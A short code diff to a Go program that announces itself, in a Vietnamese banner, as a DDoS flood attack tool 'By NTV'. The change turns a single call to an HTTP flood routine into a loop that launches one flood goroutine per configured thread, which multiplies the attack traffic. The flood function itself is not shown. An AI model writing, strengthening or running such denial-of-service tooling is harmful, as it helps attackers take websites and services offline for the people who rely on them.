@@ -42,8 +42,9 @@ func main(){
          [.. [..  [..[.   [.. [..   [..   [.. 
          [..[...  [.. [.. [..[...     [.. [... ")
    log.Print("          Tấn Công DDoS Flood By NTV ")
-    go httpflood()
-  }
+   for i:=0; i < threads; i++{
+     go httpflood()
+   }
 
   <- make(chan bool, 1)
 }
